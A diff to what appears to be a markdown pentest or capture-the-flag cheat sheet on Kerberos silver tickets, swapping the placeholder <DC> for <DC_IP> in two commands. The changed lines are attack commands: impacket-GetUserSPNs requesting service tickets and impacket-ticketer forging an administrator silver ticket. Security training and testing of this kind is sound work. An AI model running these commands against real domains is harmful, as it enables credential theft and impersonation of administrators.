@@ -13,7 +13,7 @@ tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Tic
 #### 1. Get Service Principle Name (SPN) \[Optional\]
 
 ```console
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
 ```
 
 ```console
@@ -57,7 +57,7 @@ Domain SID: S-1-5-21-4078382237-1492182817-2568127209
 #### 4. Generate Silver Ticket
 
 ```console
-impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn anything/<DC> administrator
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<DC> administrator
 ```
 
 ```console {class="sample-code"}
